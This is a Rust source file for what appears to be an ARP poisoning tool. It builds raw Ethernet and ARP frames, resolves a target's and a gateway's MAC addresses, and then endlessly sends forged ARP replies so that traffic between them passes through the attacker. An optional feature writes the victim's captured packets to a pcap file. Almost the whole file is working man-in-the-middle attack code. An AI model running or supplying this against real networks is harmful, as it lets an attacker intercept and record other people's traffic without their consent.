use std::mem;
use std::net::Ipv4Addr;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use pcap::Device;

use crate::utils::{mac_to_string, pcap_open};

#[derive(Debug, Clone)]
#[repr(C)]
pub struct Ethernet {
    pub dest_mac: [u8; 6],   /* Target hardware address */
    pub source_mac: [u8; 6], /* Sender hardware address */
    pub ether_type: u16,     /* Ethernet type           */
}

impl Ethernet {
    pub fn new(dest_mac: [u8; 6], source_mac: [u8; 6]) -> Ethernet {
        Ethernet {
            dest_mac,
            source_mac,
            ether_type: u16::to_be(0x0806),
        }
    }
}

pub enum ArpType {
    ArpRequest,
    ArpReply,
}

/* ARP Header, (assuming Ethernet+IPv4)                 */
/* Values are stored as big endian                      */
#[derive(Debug, Clone)]
#[repr(C)]
pub struct ArpHeader {
    pub ethernet: Ethernet,  /* Ethernet frame          */
    pub hardware_type: u16,  /* Hardware Type           */
    pub protocol_type: u16,  /* Protocol Type           */
    pub hardware_size: u8,   /* Hardware Address Size   */
    pub protocol_size: u8,   /* Protocol Address Size   */
    pub op_code: u16,        /* Operation Code          */
    pub source_mac: [u8; 6], /* Sender hardware address */
    pub source_ip: [u8; 4],  /* Sender IP address       */
    pub dest_mac: [u8; 6],   /* Target hardware address */
    pub dest_ip: [u8; 4],    /* Target IP address       */
}

impl ArpHeader {
    pub fn new(
        arp_type: ArpType,
        source_mac: [u8; 6],
        source_ip: Ipv4Addr,
        dest_mac: [u8; 6],
        dest_ip: Ipv4Addr,
    ) -> ArpHeader {
        let op_code: u16 = match arp_type {
            ArpType::ArpRequest => 1,
            ArpType::ArpReply => 2,
        };

        ArpHeader {
            ethernet: Ethernet::new(dest_mac, source_mac),
            hardware_type: u16::to_be(0x1),    // Ethernet
            protocol_type: u16::to_be(0x0800), // IPv4
            hardware_size: u8::to_be(6),
            protocol_size: u8::to_be(4),
            op_code: u16::to_be(op_code),
            source_mac,
            source_ip: source_ip.octets(),
            dest_mac,
            dest_ip: dest_ip.octets(),
        }
    }

    pub fn from_raw(arp_header: &[u8]) -> Option<ArpHeader> {
        if arp_header.len() < 42 {
            // ethernet (14) + arp (28)
            return None;
        }

        let mut array = [0u8; 42];
        for (&x, p) in arp_header.iter().zip(array.iter_mut()) {
            *p = x;
        }
        unsafe { Some(mem::transmute::<[u8; 42], ArpHeader>(array)) }
    }

    pub fn to_raw(&self) -> [u8; 42] {
        unsafe { mem::transmute_copy::<ArpHeader, [u8; 42]>(self) }
    }
}

pub fn arp_poisoning(
    device: Device,
    own_mac_addr: [u8; 6],
    own_ip_addr: Ipv4Addr,
    target_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    log_traffic: bool,
) {
    println!("[*] Resolving hosts (this can take a bit) ...");
    let capture = pcap_open(device.clone(), "arp").unwrap();
    let capture = Arc::new(Mutex::new(capture));
    let mac_a = resolve_mac_addr(capture.clone(), own_mac_addr, own_ip_addr, target_ip).unwrap();
    let mac_b = resolve_mac_addr(capture.clone(), own_mac_addr, own_ip_addr, gateway_ip).unwrap();

    // Enable traffic logging
    if log_traffic {
        let log_cap_filter = format!("host {}", target_ip);
        let log_file = PathBuf::from("save.pcap");
        println!("[*] Saving captured packets as {} ...", log_file.display());
        let mut log_cap = pcap_open(device, &log_cap_filter).unwrap();
        thread::spawn(move || {
            log_traffic_pcap(&mut log_cap, &log_file).expect("Unable to write packets to file")
        });
    }

    println!(
        "[+] Poisoning traffic between {} <==> {}",
        target_ip, gateway_ip
    );

    // packets used for poisoning
    let packets: Vec<ArpHeader> = vec![
        ArpHeader::new(
            ArpType::ArpReply,
            own_mac_addr,
            target_ip,
            mac_b,
            gateway_ip,
        ),
        ArpHeader::new(
            ArpType::ArpReply,
            own_mac_addr,
            gateway_ip,
            mac_a,
            target_ip,
        ),
    ];

    let mut cap = capture.lock().unwrap();
    loop {
        for p in &packets {
            if let Err(e) = cap.sendpacket(p.to_raw().as_ref()) {
                println!("Unable to send packet: {}", e)
            }
        }
        thread::sleep(Duration::from_millis(1500));
    }
}

/// This function sends an ArpRequest to resolve the mac address for the given ip
pub fn resolve_mac_addr(
    capture: Arc<Mutex<pcap::Capture<pcap::Active>>>,
    own_mac_addr: [u8; 6],
    own_ip_addr: Ipv4Addr,
    ip_addr: Ipv4Addr,
) -> Option<[u8; 6]> {
    let scoped_capture = capture.clone();
    // Spawn new thread to capture ArpReply
    let join_handle = thread::spawn(move || {
        let max_fails = 4;
        let mut fail_counter = 0;

        loop {
            if fail_counter >= max_fails {
                println!(" -> {} seems to be offline", ip_addr);
                return None;
            }
            let mut cap = scoped_capture.lock().unwrap();
            match cap.next_packet() {
                Ok(packet) => {
                    let arp_header = ArpHeader::from_raw(packet.data).unwrap();
                    let dest_ip = Ipv4Addr::new(
                        arp_header.source_ip[0],
                        arp_header.source_ip[1],
                        arp_header.source_ip[2],
                        arp_header.source_ip[3],
                    );
                    if arp_header.op_code == u16::to_be(0x2) && ip_addr == dest_ip {
                        println!(
                            " -> found {} at {}",
                            mac_to_string(&arp_header.source_mac),
                            ip_addr
                        );
                        return Some(arp_header.source_mac);
                    }
                }
                Err(_) => fail_counter += 1,
            }
        }
    });

    let crafted = ArpHeader::new(
        ArpType::ArpRequest,
        own_mac_addr,
        own_ip_addr,
        [0xff, 0xff, 0xff, 0xff, 0xff, 0xff],
        ip_addr,
    );

    // Send some ArpRequests
    for _ in 0..10 {
        let mut cap = capture.lock().unwrap();
        if let Err(e) = cap.sendpacket(crafted.to_raw()) {
            panic!("[!] Unable to send packet: {}", e);
        }
        thread::sleep(Duration::from_millis(25));
    }
    join_handle.join().unwrap()
}

/// Logs traffic to the given pcap file and prints a short network statistic
pub fn log_traffic_pcap(
    cap: &mut pcap::Capture<pcap::Active>,
    log_file: &Path,
) -> Result<(), pcap::Error> {
    let mut savefile = cap.savefile(log_file)?;

    let mut last_print = Instant::now();
    let print_threshold = Duration::from_secs(15);
    loop {
        let packet = cap.next_packet()?;
        savefile.write(&packet);
        savefile.flush()?;
        if last_print.elapsed() > print_threshold {
            let stats = cap.stats()?;
            println!(
                "\r[*] Received: {}, dropped: {}, if_dropped: {}",
                stats.received, stats.dropped, stats.if_dropped
            );
            last_print = Instant::now()
        }
    }
}
